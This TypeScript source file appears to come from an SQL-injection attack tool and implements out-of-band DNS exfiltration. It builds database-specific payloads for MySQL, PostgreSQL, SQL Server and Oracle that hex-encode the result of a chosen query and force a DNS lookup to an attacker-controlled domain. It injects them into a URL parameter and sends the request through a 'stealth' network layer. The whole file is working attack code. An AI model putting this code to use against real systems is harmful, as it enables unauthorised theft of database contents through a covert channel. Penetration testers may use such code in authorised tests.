/**
 * SOHE God Rail v3 — DNS Exfiltrator (OOB)
 *
 * Implements highly efficient out-of-band data exfiltration via DNS.
 * Packs up to 63 characters of data into a single DNS query using chunking.
 */

import { DbmsQueryLibrary } from '../DbmsQueryLibrary';
import { DbmsType } from '../../../types/sqlScanner';
import { StrategyContext } from './StrategyPlanner';
import { GhostNetwork } from '../stealth/GhostNetwork';

export class DnsExfiltrator {
    private network: GhostNetwork;
    private oobDomain: string;

    constructor(network: GhostNetwork, oobDomain: string) {
        this.network = network;
        this.oobDomain = oobDomain;
    }

    /**
     * Injects a payload designed to trigger a DNS lookup containing the target data.
     * @param extractionQuery The query whose result we want to exfiltrate
     */
    async triggerExfiltration(
        ctx: StrategyContext,
        dbms: DbmsType,
        extractionQuery: string
    ): Promise<void> {
        
        const queries = DbmsQueryLibrary.get(dbms);
        
        // Data needs to be HEX encoded to ensure it's a valid DNS subdomain
        // (no spaces, special chars, etc.)
        let encodeWrapper = '';
        if (dbms === 'MySQL') encodeWrapper = `HEX(${extractionQuery})`;
        if (dbms === 'PostgreSQL') encodeWrapper = `ENCODE(CAST(${extractionQuery} AS BYTEA), 'hex')`;
        if (dbms === 'Microsoft SQL Server') encodeWrapper = `CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), ${extractionQuery}), 2)`;
        if (dbms === 'Oracle') encodeWrapper = `RAWTOHEX(UTL_RAW.CAST_TO_RAW(${extractionQuery}))`;

        // If we don't have a specific hex wrapper, just try to use the raw query and hope it's safe
        const safeData = encodeWrapper || extractionQuery;

        // Generate the OOB payload (e.g. LOAD_FILE('\\\\data.oob.com\\a'))
        const oobPayload = queries.oobDns(safeData, this.oobDomain);
        
        // Wrap it in a way that executes (e.g. an error function or UNION)
        // Here we use the primary error function as a generic execution wrapper
        const fullPayload = queries.errorExtract.primary(oobPayload);

        // Inject and send
        const req = JSON.parse(JSON.stringify(ctx.baseRequest));
        const url = new URL(req.url);
        // Assuming we are appending to the parameter
        url.searchParams.set(ctx.parameterName, `${ctx.originalValue} ${fullPayload}`);
        req.url = url.toString();
        
        await this.network.executeRequest(req);
        
        // Note: The actual data retrieval happens via an external polling mechanism 
        // to the OOB server (Interactsh, Burp Collab, etc.)
    }
}
